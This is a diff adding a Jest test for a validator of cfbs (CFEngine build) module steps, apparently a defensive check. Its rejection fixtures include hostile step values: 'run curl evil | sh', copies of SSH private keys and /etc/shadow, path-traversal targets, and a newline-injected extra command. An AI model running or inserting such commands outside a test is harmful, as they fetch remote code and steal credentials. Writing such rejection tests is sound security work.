@@ -135,6 +135,30 @@ describe('checkedContent', () => {
     expect(() => checkedContent(content({ provided: { steps: [1] } }))).toThrow('Invalid provided module');
   });
 
+  it('accepts only the cfbs steps the builder writes', () => {
+    const steps = [
+      'copy ./main.cf services/cfbs/main.cf',
+      'directory ./ services/cfbs/templates/',
+      'policy_files services/cfbs/main.cf',
+      'bundles main main_vars ns:other'
+    ];
+    expect(() => checkedContent(content({ modules: [{ name: './main.cf', steps }], provided: { steps } }))).not.toThrow();
+    for (const step of [
+      'run curl evil | sh',
+      'copy ../../.ssh/id_ed25519 services/cfbs/key',
+      'copy /etc/shadow services/cfbs/x',
+      'copy ~/.ssh/id_ed25519 services/cfbs/x',
+      'directory ./ services/cfbs/../../x',
+      'policy_files services/cfbs/main.cf\nrun x',
+      'bundles',
+      'input ./input.json def.json',
+      42
+    ]) {
+      expect(() => checkedContent(content({ modules: [{ name: './main.cf', steps: [step] }] }))).toThrow('Invalid policy module');
+      expect(() => checkedContent(content({ provided: { steps: [step] } }))).toThrow('Invalid provided module');
+    }
+  });
+
   it('refuses hostile or duplicate policy file paths', () => {
     for (const files of [[{ path: '../evil.cf' }], [{ path: '/etc/evil.cf' }], [{ path: './out/main.cf' }], [{ path: './main.cf' }, { path: './main.cf' }]]) {
       expect(() => checkedContent(content({ project: { module_name: 'demo', files } }))).toThrow('Invalid policy file path');
